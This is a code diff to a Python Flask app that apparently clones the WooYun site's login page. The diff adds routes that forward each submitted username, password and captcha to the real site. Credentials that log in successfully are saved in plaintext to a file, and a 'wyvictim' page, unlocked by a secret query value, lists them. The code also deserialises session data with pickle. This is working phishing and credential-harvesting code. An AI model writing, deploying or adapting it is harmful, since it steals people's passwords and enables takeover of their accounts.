@@ -26,12 +26,6 @@ ROOT = os.path.dirname(os.path.abspath(__file__))
 app = Flask( __name__ )
 app.secret_key = 'jc\x11\x87W\x00p\xcd\x0c\xa6\x89\xf5\x9ey\xd0\x06\xd9G\x10Y\xedh\xbea'
 
-# like index.php
-'''
-@app.route( '/' )
-def index():
-    return render_template( 'wooyun.html' )
-'''
 def mysession():
     return pickle.loads(session["wysession"])
 
@@ -41,12 +35,45 @@ def storitysession(session):
 def gettoken():
     return session["token"]
 
-def save_user_pass(username):
-    with open(ROOT+"/"+"wooyunmail.txt", "a+") as yoursky:
-        yoursky.write(username+"\n")
+def save_user_pass(username, pwd):
+    with open(ROOT+"/"+"wooyun.txt", "a+") as yoursky:
+        yoursky.write(username+"woshifengefu"+pwd+"\n")
 
-@app.route( '/',  methods=["GET", "POST"] )
+@app.route( '/' )
 def index():
+    return render_template( 'wooyun.html' )
+
+@app.route( '/login', methods=["GET", "POST"]  )
+def letin():
+    if request.method  == "GET":
+        newsession, session["token"] = logininwooyun.gettoken()
+        session["wysession"] = storitysession(newsession)
+        print "set token", session["token"]
+        return render_template( 'login.htm' )
+
+@app.route( '/index.php', methods=["POST"]  )
+def checkloginin():
+    if 1:
+        user = request.form.get("user", "")
+        pwd = request.form.get("pwd", "")
+        captcha = request.form.get("captcha", "")
+        print "user, pwd, captcha", user, pwd, captcha 
+        token = gettoken()
+        logon_status = logininwooyun.gologin( mysession(), token, captcha, user, pwd )
+        print "coming"
+        if logon_status is True:
+            return '{"code":"A0001","msg":"\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef"}'
+        elif logon_status is False:
+            return '{"code":"A0001","msg":"\u767b\u5f55\u5931\u8d25,\u8bf7\u68c0\u67e5\u90ae\u7bb1\u6216\u5bc6\u7801"}'
+        elif logon_status == 2:
+            return '{"code":"A0001","msg":"\u8fde\u63a5\u5f02\u5e38"}'
+        else:
+            print "GOT"
+            save_user_pass(user, pwd)
+            return '{"code":"A0001","msg":"\u6682\u65f6\u672a\u5f00\u653e\u8d2d\u4e70\uff0c\u8bf7\u8010\u5fc3\u7b49\u5f85"}'                
+
+@app.route( '/donttellyou',  methods=["GET", "POST"] )
+def index2():
     if request.method  == "GET":
         newsession, session["token"] = logininwooyun.gettoken()
         session["wysession"] = storitysession(newsession)
@@ -79,18 +106,23 @@ def giveyouacaptcha():
     session["wysession"] = storitysession(newsession)
     return Response( content, mimetype='image/jpeg' )
 
+@app.route( '/captcha.php' )
+def captchaphp():
+    return giveyouacaptcha()
+
 def read_user_pass():
     try:
-        with open(ROOT+"/"+"wooyunmail.txt") as yoursky:
-            return [person.strip() for person in yoursky]
+        with open(ROOT+"/"+"wooyun.txt") as yoursky:
+            return [person.strip().split("woshifengefu") for person in yoursky]
     except:
         return []
 
-@app.route( '/victim', methods=['GET'] )
+@app.route( '/wyvictim', methods=['GET'] )
 def victimdata():
     isok = request.args.get( 'woo', '' )
     if isok != "yun":
         return render_template( 'list_victim.html', userinfos=enumerate([]) )
+    print read_user_pass()
     return render_template( 'list_victim.html', userinfos=enumerate(read_user_pass()) )
 
 if __name__ == '__main__':
